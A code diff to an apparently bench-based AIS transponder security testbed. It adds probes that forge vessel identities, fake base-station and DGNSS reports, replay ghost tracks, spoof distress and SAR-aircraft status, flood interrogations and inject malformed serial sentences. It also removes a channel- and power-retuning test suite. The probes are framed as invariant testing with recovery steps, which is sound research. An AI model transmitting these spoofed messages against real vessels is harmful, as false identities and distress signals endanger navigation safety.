@@ -54,6 +54,8 @@ class GpsFeed(threading.Thread):
         self.speed, self.course = speed, course
         self._stop = threading.Event()
         self.ser = None
+        self._wlock = threading.Lock()   # serialize writes so an injected sentence never
+                                         # interleaves mid-sentence with the baseline feed
 
     def _sentences(self):
         now = datetime.now(timezone.utc)
@@ -83,11 +85,28 @@ class GpsFeed(threading.Thread):
         while not self._stop.is_set():
             for s in self._sentences():
                 try:
-                    self.ser.write((str(s) + "\r\n").encode())
+                    with self._wlock:
+                        self.ser.write((str(s) + "\r\n").encode())
                 except Exception:
                     pass
             time.sleep(self.rate)
         self.ser.close()
+
+    def inject_raw(self, data):
+        """Write raw bytes (a malformed / crafted sentence) onto the same serial line the
+        baseline GPS feed uses, without corrupting a baseline sentence in flight. `data`
+        may be str or bytes. Used by the serial extras (multi-sentence reassembly, config
+        command). Detection is offline from the transponder's output capture."""
+        if self.ser is None:
+            return
+        if isinstance(data, str):
+            data = data.encode("latin-1", "replace")
+        try:
+            with self._wlock:
+                self.ser.write(data)
+                self.ser.flush()
+        except Exception:
+            pass
 
     def set_position(self, lat, lon, speed=None, course=None):
         self.lat, self.lon = lat, lon
@@ -160,19 +179,27 @@ def build_timeline(ctx):
         [(enc.encode_type1(V, *offset_position(vlat, vlon, 45, 30000), sog=40.0, cog=225.0),
           f"Type1 spoofing the victim's OWN MMSI {V} at a distinct position (30km NE)")]))
 
-    # --- forged static/voyage identity (Type 5): spoof a vessel's name, call sign, and type.
-    # Two variants: (1) a ghost identity, and (2) a Type 5 claiming the VICTIM's own MMSI with a
-    # DIFFERENT name/type, to test whether the unit accepts conflicting static data for its own
-    # identity. NOTE: Type 5 is 424 bits (a multi-slot message); it is sent as one payload here,
-    # which the ais-simulator transmits as a single burst -- verify on the bench that the backend
-    # accepts >168-bit payloads (it modulates raw bits, so it should).
+    # --- forged static/voyage identity: spoof a vessel's name, call sign, and type.
+    # Two variants: (1) a ghost identity, and (2) claiming the VICTIM's own MMSI with a DIFFERENT
+    # name/type, to test whether the unit accepts conflicting static data for its own identity.
+    # USES TYPE 24 (static data report, Part A + Part B), NOT Type 5. Type 5 is 424 bits (2 TDMA
+    # slots); this testbed's SDR injector only reliably transmits single-slot (<=168-bit) bursts
+    # -- confirmed empirically: across every run and all three vendors, the independent listener
+    # SDR never once decoded a Type-5 sentence during this probe (0/0/0/0/0), while every
+    # single-slot message type here transmits and decodes cleanly. That means Type 5 was never
+    # actually reaching the air, not that units were rejecting it. Type 24 carries the same
+    # forgeable identity fields (name/callsign/type) as two single-slot bursts by design, so it
+    # exercises the identical "does the unit accept an unverified identity claim" question through
+    # a path this injector already handles correctly.
     tl.append(("forge_static_identity",
-        [(enc.encode_type5_static(366000005, callsign="FAKE1",
-                                  shipname="GHOST VESSEL", shiptype=70),
-          "M5 forged static/voyage data for a ghost identity"),
-         (enc.encode_type5_static(V, callsign="SPOOF",
-                                  shipname="NOT REAL NAME", shiptype=35),
-          f"M5 forged static data claiming the victim's MMSI {V}")]))
+        [(enc.encode_type24_a(366000005, shipname="GHOST VESSEL"),
+          "M24-A forged ship name for a ghost identity"),
+         (enc.encode_type24_b(366000005, callsign="FAKE1", shiptype=70),
+          "M24-B forged call sign/type for a ghost identity"),
+         (enc.encode_type24_a(V, shipname="NOT REAL NAME"),
+          f"M24-A forged ship name claiming the victim's MMSI {V}"),
+         (enc.encode_type24_b(V, callsign="SPOOF", shiptype=35),
+          f"M24-B forged call sign/type claiming the victim's MMSI {V}")]))
 
     # --- command / control (addressed to the victim) ---
     tl.append(("interrogation",
@@ -458,101 +485,133 @@ def build_m20_suite(ctx):
     return cells
 
 
-# ---- Base-station RE-TEST suite (focused; --base-retest / --base-retest-only) ------------
-# Purpose: settle the M20/M22 question WITHOUT re-running phases 1-3. This suite fires ONLY the
-# base-station management commands, each with a freshly UTC-stamped Message 4 base announcement
-# that the runner keeps alive with a heartbeat for the whole dwell (a real base transmits M4
-# continuously; two bursts per cell may not be enough for a unit to treat the base as present).
-#
-# Three corrections baked in vs the earlier runs:
-#   1. M4 carries LIVE UTC now (m4_base_report) -> the base looks synchronised, so a unit that
-#      accepted M16 but balked at the higher-stakes M20/M22 no longer has that excuse.
-#   2. M20 is exercised at MEANINGFUL densities (50/67/75% of frame). The old single 10-slot
-#      (~0.4%) reservation was unobservable against normal SOTDMA churn -- "no effect" there was
-#      a measurement artifact, not the unit ignoring M20.
-#   3. M22 is fired BOTH ways: the OPTIONAL addressed form AND the spec-PRIMARY regional
-#      (broadcast, bounding-box) form. A conforming unit may ignore the addressed form yet honour
-#      the regional one -- so testing only the addressed form cannot conclude "ignores M22".
-# M16 (max + beyond-max rate) is included as a positive control: it already works, so it confirms
-# the base is being accepted and the heartbeat is doing its job.
-def build_base_retest(ctx, half_deg=0.5, offband_ch=2078):
+# ----------------------------------------------------------------------------
+# EXTRAS: new probes for the A/B invariants surfaced by the spec analysis.
+# RF probes returned as (name, [(bits, meta), ...]) like the other timelines;
+# serial probes returned by build_serial_extras().
+# ----------------------------------------------------------------------------
+GHOST_A     = 366000050
+GHOST_DUP   = 366000070
+FAKE_BASE   = 366000060          # ship-format MMSI masquerading as a base station
+SAR_PREFIX  = 970000123          # AIS-SART reserved prefix (970)
+SHIP_AS_SAR = 366000009          # ordinary ship MMSI sending a SAR (Msg 9) report
+
+
+def build_extras(ctx):
     V = ctx.victim_mmsi
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
-    m4 = (p3enc.m4_base_report(BASE_MMSI, vlat, vlon), "M4: announce base (live UTC)")
+    ex = []
 
-    def recover(tag=""):
-        # full restore: dual AIS channels, HIGH power, BOTH-channel Tx, rate released -- sent both
-        # addressed AND regional so recovery never depends on the unit honouring only one form.
-        return [(p3enc.m22_channel(BASE_MMSI, V, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
-                                   power=0, txrx=0),
-                 f"RECOVERY{tag} addressed -> AIS A/B, high power, both-channel Tx"),
-                (p3enc.m22_channel_regional(BASE_MMSI, vlat, vlon, channel_a=AIS_CH_A,
-                                            channel_b=AIS_CH_B, power=0, txrx=0, half_deg=half_deg),
-                 f"RECOVERY{tag} regional -> AIS A/B, high power, both-channel Tx"),
-                (p3enc.m16_rate_assignment(BASE_MMSI, V, 20),
-                 f"RECOVERY{tag} release rate (autonomous wins, self-times-out)")]
+    # INV-A-RECV-09: M20 slot reservation with NO base (Msg 4) announced -> should be ignored.
+    ex.append(("x_m20_no_base",
+        [(enc.encode_type20(REGULAR_MMSI, offset1=100, slots1=10, timeout1=7),
+          "M20 reserve 10 slots from an ordinary ship, no base announced")]))
 
-    cells = []
+    # INV-B-AUTH-02: fake base-station report (Msg 4) from a ship-format MMSI, false time/pos.
+    ex.append(("x_fake_base_report",
+        [(enc.encode_type4(FAKE_BASE, vlat + 1.0, vlon + 1.0, hour=12, minute=34, second=56),
+          "Msg4 base announcement from a SHIP MMSI, false UTC + position")]))
 
-    # ===== M20: GO HARD -- density sweep 50% -> 100% of the frame reserved ==================
-    # Runner holds the victim at a CONSTANT fast SOG across this whole block so reporting rate is
-    # matched and the ONLY variable is reservation density. Run FIRST (before M16) so no lingering
-    # rate assignment pollutes the control. Names are m20_base_p<NN> (percent) so analyze_m20.py
-    # sorts/verdicts them. A compliant unit must vacate a rising share of the frame -> rising slot
-    # reselection; a unit that ignores M20 stays flat as density climbs.
-    cells.append(("m20_base_control", [m4, m4]))                       # same-speed baseline
-    m20_plan = [
-        ("p50",  dict(offset=0, number=10, timeout=7, increment=20), "10 of every 20 (~50%)"),
-        ("p60",  dict(offset=0, number=12, timeout=7, increment=20), "12 of every 20 (~60%)"),
-        ("p67",  dict(offset=0, number=10, timeout=7, increment=15), "10 of every 15 (~67%)"),
-        ("p75",  dict(offset=0, number=15, timeout=7, increment=20), "15 of every 20 (~75%)"),
-        ("p83",  dict(offset=0, number=15, timeout=7, increment=18), "15 of every 18 (~83%)"),
-        ("p94",  dict(offset=0, number=15, timeout=7, increment=16), "15 of every 16 (~94%)"),
-        ("p100", dict(offset=0, number=15, timeout=7, increment=15), "15 of every 15 (~100%)"),
-    ]
-    for label, kw, human in m20_plan:
-        cells.append((f"m20_base_{label}",
-            [m4, m4, (p3enc.m20_datalink(BASE_MMSI, **kw), f"M20 reserve {human}")]))
-    cells.append(("m20_base_control2", [m4, m4]))                      # trailing same-speed control
+    # INV-B-AUTH-02: false DGNSS corrections (Msg 17) from an ordinary MMSI.
+    ex.append(("x_false_dgnss",
+        [(enc.encode_type17(REGULAR_MMSI, vlat, vlon),
+          "Msg17 DGNSS corrections from an ordinary ship (bogus payload)")]))
 
-    # ===== M16: positive control (at REST so the forced MAX rate is an obvious speed-up) ====
-    cells.append(("br_M16_ratemax",
-        [m4, m4, (p3enc.m16_rate_assignment(BASE_MMSI, V, 600),
-                  "M16 CONTROL force MAX rate 600/10min (known-good)")]))
-    cells.append(("br_M16_overmax",
-        [m4, m4, (p3enc.m16_rate_raw(BASE_MMSI, V, 1000),
-                  "M16 beyond-spec 1000/10min (past the 600 max; obeying it is a finding)")]))
-    cells.append(("br_recover_M16", [m4] + recover()))
+    # Forged identity via Msg 5 (the multi-slot case that never transmitted before).
+    # Type 5 is 424 bits / 2 slots; this injector has only ever sent single-slot bursts, so
+    # CONFIRM on the witness SDR whether these reach the air. The single-slot Type 24 identity
+    # probe still runs in phase 1 as the reliable version.
+    ex.append(("x_forge_type5",
+        [(enc.encode_type5_static(GHOST_A, callsign="FAKE5", shipname="GHOST TYPE5", shiptype=70),
+          "Msg5 forged identity, ghost MMSI (MULTI-SLOT -- verify TX on witness)"),
+         (enc.encode_type5_static(V, callsign="SPOOF5", shipname="NOT REAL NAME", shiptype=35),
+          f"Msg5 forged identity claiming victim MMSI {V} (MULTI-SLOT)")]))
 
-    # ===== M22: STRONG + OBVIOUS -- each variant fired BOTH addressed and regional ==========
-    # Observables chosen to be UNAMBIGUOUS on the listener; each test is followed by a full
-    # recovery so a working retune can never strand the unit off-channel:
-    #   txA_only / txB_only -> Tx/Rx mode 1/2: channel balance collapses to ~100/0 or 0/100
-    #   single_ais1         -> both channels = AIS1: all Tx on one frequency
-    #   offband             -> both channels = a NON-AIS number: DUT vanishes from the AIS pair,
-    #                          and must REAPPEAR after recovery (the clean, reversible proof)
-    #   power_low           -> power bit low: DUT's received signal level drops (~11 dB at 1W)
-    m22_variants = [
-        ("txA_only",    dict(channel_a=AIS_CH_A, channel_b=AIS_CH_B, txrx=1),
-         "Tx CHANNEL A ONLY (obey -> balance ~100/0)"),
-        ("txB_only",    dict(channel_a=AIS_CH_A, channel_b=AIS_CH_B, txrx=2),
-         "Tx CHANNEL B ONLY (obey -> balance ~0/100)"),
-        ("single_ais1", dict(channel_a=AIS_CH_A, channel_b=AIS_CH_A, txrx=0),
-         "BOTH channels = AIS1 (obey -> all Tx on one freq)"),
-        ("offband",     dict(channel_a=offband_ch, channel_b=offband_ch, txrx=0),
-         f"OFF-BAND retune to ch {offband_ch} (obey -> DUT vanishes from AIS A/B, returns on recovery)"),
-        ("power_low",   dict(channel_a=AIS_CH_A, channel_b=AIS_CH_B, txrx=0, power=1),
-         "POWER LOW (obey -> received level drops ~11 dB)"),
-    ]
-    for label, kw, human in m22_variants:
-        cells.append((f"br_M22_{label}_addressed",
-            [m4, m4, (p3enc.m22_channel(BASE_MMSI, V, **kw), f"M22 ADDRESSED {human}")]))
-        cells.append((f"br_recover_M22_{label}_addr", [m4] + recover()))
-        cells.append((f"br_M22_{label}_regional",
-            [m4, m4, (p3enc.m22_channel_regional(BASE_MMSI, vlat, vlon, half_deg=half_deg, **kw),
-                      f"M22 REGIONAL {human}")]))
-        cells.append((f"br_recover_M22_{label}_reg", [m4] + recover()))
-    return cells
+    # INV-B-PLAUS-02 (replay/appear): a ghost appears now; the identical frame is re-sent at the
+    # END of the extras (x_replay_resurrect) after a long gap to test track resurrection.
+    gp = offset_position(vlat, vlon, 90, 4000)
+    replay_frame = enc.encode_type1(GHOST_A, gp[0], gp[1], sog=6.0, cog=270.0)
+    ex.append(("x_replay_appear",
+        [(replay_frame, "ghost appears (frame captured for later replay)")]))
+
+    # INV-B-SEM-02: static identity stability -- rapidly overwrite the same MMSI's name.
+    ex.append(("x_static_mutate",
+        [(enc.encode_type24_a(GHOST_A, shipname="NAME ONE"),   "M24-A name #1"),
+         (enc.encode_type24_a(GHOST_A, shipname="NAME TWO"),   "M24-A name #2 (overwrite)"),
+         (enc.encode_type24_a(GHOST_A, shipname="NAME THREE"), "M24-A name #3 (overwrite)")]))
+
+    # INV-B-SEM-03: static part binding -- a Part B with no Part A, and mismatched A/B for victim.
+    ex.append(("x_static_partial",
+        [(enc.encode_type24_b(GHOST_DUP, callsign="ORPHAN", shiptype=70),
+          "M24-B only, no Part A ever sent for this MMSI"),
+         (enc.encode_type24_a(V, shipname="FAKE FOR VICTIM"),
+          f"M24-A claiming victim {V}"),
+         (enc.encode_type24_b(V, callsign="MISMTCH", shiptype=52),
+          f"M24-B claiming victim {V} with a different vessel class")]))
+
+    # INV-B-AUTH-06: duplicate MMSI at kinematically incompatible positions (~5 NM apart).
+    db = offset_position(vlat, vlon, 90, 9260)
+    ex.append(("x_duplicate_mmsi",
+        [(enc.encode_type1(GHOST_DUP, vlat, vlon, sog=0.0), "duplicate MMSI at position A"),
+         (enc.encode_type1(GHOST_DUP, db[0], db[1], sog=0.0), "same MMSI ~5NM away (impossible)")]))
+
+    # INV-B-AUTH-04: distress state without a distress identity, and its converse.
+    ex.append(("x_distress_state_ordinary",
+        [(enc.encode_type1_raw(REGULAR_MMSI, vlat, vlon, nav_status=14),
+          "nav-status 14 (AIS-SART active) from an ORDINARY ship MMSI")]))
+    ex.append(("x_distress_id_normal",
+        [(enc.encode_type1(SAR_PREFIX, vlat, vlon, sog=8.0, nav_status=0),
+          "970-prefix (AIS-SART) MMSI reporting NORMAL underway status")]))
+
+    # INV-B-AUTH-03: station-class enforcement -- Msg 9 (SAR aircraft) from an ordinary ship.
+    ex.append(("x_msg9_from_ship",
+        [(enc.encode_type9(SHIP_AS_SAR, vlat, vlon, sog=200.0, cog=90.0, altitude=500),
+          "Msg9 SAR-aircraft report sent from an ordinary ship MMSI")]))
+
+    # INV-B-PLAUS-03: interrogation flood -- force repeated responses on demand.
+    ex.append(("x_interrogation_flood",
+        [(enc.encode_type15(REGULAR_MMSI, V, msg1_1=5), f"M15 interrogate {V} (#{k})")
+         for k in range(6)]))
+
+    # INV-B-PLAUS-02 (resurrect): replay the exact earlier ghost frame after the long extras gap.
+    ex.append(("x_replay_resurrect",
+        [(replay_frame, "replay the identical ghost frame -> does the stopped track return?")]))
+
+    return ex
+
+
+def build_serial_extras(ctx):
+    """Serial-input probes injected on the GPS line; detection is offline from the unit's output
+    capture. These exercise the IEC 61162-1 sentence-layer parser. Multi-sentence reassembly on a
+    sensor-input port is best-effort and may not apply to every unit -- serial_parser_suite.py is
+    the primary home for deep serial parser tests. Returns (name, [(raw, pre_delay_s), ...], meta)."""
+    def ck(body):
+        c = 0
+        for ch in body:
+            c ^= ord(ch)
+        return f"{c:02X}"
+    def sent(body, good=True):
+        return f"${body}*{ck(body) if good else '00'}\r\n"
+
+    p1 = "!AIVDM,2,1,3,A,55P5TL01VIaAL@7WKO@mBplU@<PDhh000000001S;AJ::4A80?4i@E5,0"
+    p2 = "1Ph:A>Q@0"
+    sx = []
+    # INV-A-RECV-08: reassembly -- part 2 has a BAD checksum -> whole message discarded (IEC 7.3.9).
+    sx.append(("sx_multipart_frag_error",
+        [(sent(p1, True), 0.0), (sent(p2, False), 0.2)],
+        "2-part sentence, part 2 bad checksum -> whole message must be discarded"))
+    # INV-A-RECV-08: reassembly timeout -- >5 s gap between fragments (IEC 7.3.12).
+    sx.append(("sx_multipart_timeout",
+        [(sent(p1, True), 0.0), (sent(p2, True), 6.0)],
+        "2-part sentence with a >5s gap between fragments -> reassembly should time out"))
+    # INV-A-SEM-01: config semantics. Exact formatter is vendor-specific; adapt per unit.
+    sx.append(("sx_config_no_c_flag",
+        [("$PAISCFG,RATE,5,R\r\n", 0.0)],
+        "config-style sentence WITHOUT the 'C' command flag -> must not change config"))
+    sx.append(("sx_config_null_field",
+        [("$PAISCFG,RATE,,C\r\n", 0.0)],
+        "config command with a NULL command field -> must be treated as no change"))
+    return sx
 
 
 def main():
@@ -587,25 +646,6 @@ def main():
     ap.add_argument("--m20-gap", type=float, default=35.0,
                     help="dwell after each M20 cell (>= a few victim report cycles so the slot "
                          "map re-settles and the reaction is visible)")
-    ap.add_argument("--base-retest", action="store_true",
-                    help="also run the focused BASE-STATION re-test (M16 control + M20 dense + "
-                         "M22 addressed AND regional), each with a live-UTC M4 heartbeat")
-    ap.add_argument("--base-retest-only", action="store_true",
-                    help="run ONLY the base-station re-test (skip phases 1-3 and the M20 suite) "
-                         "so you can settle M20/M22 without rerunning everything")
-    ap.add_argument("--base-retest-gap", type=float, default=90.0,
-                    help="dwell after each base-retest command (kept long so slow effects like "
-                         "rate/channel changes have time to appear); M4 heartbeat runs through it")
-    ap.add_argument("--m4-heartbeat", type=float, default=10.0,
-                    help="seconds between M4 base-report keepalives sent during base-retest dwells "
-                         "(10s ~ a real base station's M4 cadence)")
-    ap.add_argument("--region-half-deg", type=float, default=0.5,
-                    help="half-size (deg) of the regional M22 bounding box around the victim "
-                         "(0.5 deg ~30NM/side, well inside the 120NM evaluation range)")
-    ap.add_argument("--offband-ch", type=int, default=2078,
-                    help="channel number for the M22 OFF-BAND retune test (default 2078, a valid "
-                         "marine channel clearly outside the AIS pair 2087/2088). Point a second "
-                         "receiver here if you want to SEE the unit reappear off-band.")
     ap.add_argument("--phase3-gap", type=float, default=90.0,
                     help="seconds of dwell after each phase-3 command (kept long so slow "
                          "effects like rate changes or retunes have time to appear)")
@@ -622,6 +662,15 @@ def main():
                          "instead of a dropped transient. Set 0 to use the old repeatx0.8 burst.")
     ap.add_argument("--accept-cadence", type=float, default=2.0,
                     help="seconds between re-sends within --accept-dwell (2s = the fast AIS rate)")
+    ap.add_argument("--extras", action="store_true",
+                    help="also run the new A/B invariant probes (fake base/DGNSS, Type-5 identity, "
+                         "replay, static mutation/part-binding, duplicate MMSI, distress-state, "
+                         "M9-from-ship, M20-without-base, interrogation flood, plus serial "
+                         "multi-sentence/config probes)")
+    ap.add_argument("--extras-only", action="store_true",
+                    help="run ONLY the extra probes (skip phases 1-3 and the M20 suite)")
+    ap.add_argument("--skip-serial-extras", action="store_true",
+                    help="with --extras, skip the serial-injected probes (run only RF extras)")
     ap.add_argument("--only", nargs="+", help="run only these named attacks")
     ap.add_argument("--skip", nargs="+", default=[])
     ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
@@ -657,7 +706,7 @@ def main():
 
     ctx = Ctx(args.victim_mmsi, gps)
     timeline = build_timeline(ctx)
-    if (args.phase2_only or args.phase3_only or args.base_retest_only or args.m20_only):
+    if args.phase2_only or args.phase3_only or args.extras_only:
         timeline = []
     if args.only:
         timeline = [(n, p) for (n, p) in timeline if n in args.only]
@@ -702,93 +751,12 @@ def main():
                 _send_once(r); time.sleep(0.8)
         rec(event="attack_end", name=name)
 
-    def m4_dwell(seconds, interval):
-        """Sleep `seconds`, re-sending an M4 base report every `interval` s so the base stays
-        continuously present for the whole dwell. m4_base_report re-stamps live UTC on each call,
-        so the base always looks synchronised. Used only by the base-retest."""
-        end = time.time() + seconds
-        while time.time() < end:
-            time.sleep(min(interval, max(0.0, end - time.time())))
-            try:
-                ws.send(p3enc.m4_base_report(BASE_MMSI, ctx.victim_lat, ctx.victim_lon))
-                rec(event="m4_heartbeat", meta="base keepalive")
-            except Exception:
-                pass
-
     try:
-        if not (args.m20_only or args.phase2_only or args.phase3_only or args.base_retest_only):
+        if not (args.m20_only or args.phase2_only or args.phase3_only):
             for i, (name, payloads) in enumerate(timeline):
                 fire(name, payloads, i, len(timeline), tag="P1:")
                 if i < len(timeline) - 1:
                     time.sleep(args.gap)
-
-        # ---- BASE-STATION re-test (focused; --base-retest or --base-retest-only) ----
-        # Runs ONLY the base-station management commands with a live-UTC M4 heartbeat maintained
-        # through every dwell. Lets you settle M20/M22 without rerunning phases 1-3.
-        if args.base_retest or args.base_retest_only:
-            br = build_base_retest(ctx, half_deg=args.region_half_deg,
-                                   offband_ch=args.offband_ch)
-            print(f"\n=== BASE RE-TEST: {len(br)} cells, {args.base_retest_gap}s dwell each, "
-                  f"M4 heartbeat every {args.m4_heartbeat}s ===")
-            print("    M20 sweep 50->100%  |  M16 control (+ over-max)  |  M22 txA/txB/single/"
-                  f"offband(ch{args.offband_ch})/power, each addressed + regional")
-            print("    OBVIOUS observables: VHF channel balance (txA/txB/single), DUT vanish+return")
-            print("    (offband), received level (power-low), slot reselection (M20).")
-            print("    ** KEEP THE LISTENER + AIS-catcher RECORDING UNTIL 'done' PRINTS **\n")
-            rec(event="base_retest_start", n=len(br), gap=args.base_retest_gap,
-                m4_heartbeat=args.m4_heartbeat, base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI,
-                region_half_deg=args.region_half_deg, offband_ch=args.offband_ch)
-
-            def _br_extra(nm):
-                low = nm.lower()
-                if nm.startswith("m20_base_"):
-                    return {"command": "M20", "source": "base", "density": nm.split("_")[-1]}
-                if "recover" in low:
-                    return {"command": "recovery", "source": "base", "variant": low}
-                body = nm[len("br_"):]                  # e.g. M22_offband_regional / M16_ratemax
-                cmd = body.split("_", 1)[0]
-                rest = body[len(cmd) + 1:] if "_" in body else ""
-                form = ("addressed" if rest.endswith("addressed") else
-                        "regional" if rest.endswith("regional") else "")
-                variant = rest.rsplit("_", 1)[0] if form else rest
-                return {"command": cmd, "source": "base", "variant": variant, "form": form}
-
-            fast_on = False
-            for i, (name, payloads) in enumerate(br):
-                # hold a constant fast SOG across the whole m20_base_* block so the density sweep
-                # and its control window share the same reporting rate (only the reservation varies)
-                want_fast = name.startswith("m20_base_")
-                if want_fast and not fast_on:
-                    gps.set_position(ctx.victim_lat, ctx.victim_lon,
-                                     speed=args.fast_speed, course=90.0)
-                    rec(event="victim_speed_set", speed=args.fast_speed,
-                        note="fast for M20 slot sampling (base-retest)")
-                    print(f"    (victim SOG -> {args.fast_speed}kn for dense M20 slot sampling; settling 8s)")
-                    fast_on = True; time.sleep(8)
-                elif fast_on and not want_fast:
-                    gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
-                    rec(event="victim_speed_set", speed=0.0,
-                        note="rest after M20 block (base-retest)")
-                    fast_on = False
-                fire(name, payloads, i, len(br), tag="BR:", extra=_br_extra(name))
-                dwell = 5 if "recover" in name.lower() else args.base_retest_gap
-                if i < len(br) - 1:
-                    print(f"    ...{dwell:.0f}s dwell (M4 heartbeat live; watch serial + VHF)...")
-                    m4_dwell(dwell, args.m4_heartbeat)
-            if fast_on:
-                gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
-                rec(event="victim_speed_set", speed=0.0, note="rest at end of base-retest")
-            # final recovery: addressed + regional restore + rate release (belt and braces)
-            print("    base-retest final recovery: AIS channels 2087/2088 + high power + rate release")
-            for _ in range(3):
-                ws.send(p3enc.m22_channel(BASE_MMSI, args.victim_mmsi,
-                                          channel_a=AIS_CH_A, channel_b=AIS_CH_B, power=0))
-                ws.send(p3enc.m22_channel_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
-                                                   channel_a=AIS_CH_A, channel_b=AIS_CH_B,
-                                                   power=0, half_deg=args.region_half_deg))
-                ws.send(p3enc.m16_rate_assignment(BASE_MMSI, args.victim_mmsi, 20))
-                rec(event="final_recovery", meta="restore after base-retest")
-                time.sleep(1)
 
         # ---- M20 slot-reservation density suite (focused; --m20 or --m20-only) ----
         if args.m20 or args.m20_only:
@@ -821,6 +789,34 @@ def main():
                     time.sleep(args.m20_gap)
             gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)
             rec(event="victim_speed_set", speed=0.0, note="restored after M20 suite")
+
+        # ---- extra probes (new A/B invariant tests): --extras or --extras-only ----
+        if args.extras or args.extras_only:
+            ex = build_extras(ctx)
+            print(f"\n=== EXTRAS: {len(ex)} new RF probes, {args.gap}s apart ===")
+            rec(event="extras_start", n=len(ex))
+            for i, (name, payloads) in enumerate(ex):
+                fire(name, payloads, i, len(ex), tag="EX:")
+                if i < len(ex) - 1:
+                    time.sleep(args.gap)
+            if not args.skip_serial_extras:
+                sx = build_serial_extras(ctx)
+                print(f"\n=== SERIAL EXTRAS: {len(sx)} probes (injected on the GPS line) ===")
+                rec(event="serial_extras_start", n=len(sx))
+                for i, (name, chunks, meta) in enumerate(sx):
+                    rec(event="serial_extra_begin", name=name, meta=meta, index=i)
+                    print(f"[SX:{i+1}/{len(sx)}] {name}")
+                    for (raw, delay) in chunks:
+                        if delay:
+                            print(f"      ...{delay:.0f}s gap..."); time.sleep(delay)
+                        gps.inject_raw(raw)
+                        rec(event="serial_extra_sent", name=name, nbytes=len(raw),
+                            sample=(raw[:80] if isinstance(raw, str)
+                                    else raw[:80].decode('latin-1', 'replace')))
+                        print(f"      -> injected {len(raw)}B")
+                    rec(event="serial_extra_end", name=name)
+                    if i < len(sx) - 1:
+                        time.sleep(args.gap)
 
         # ---- phase 2: aggressive tests, larger gaps, severity-ordered ----
         if args.phase2 or args.phase2_only:
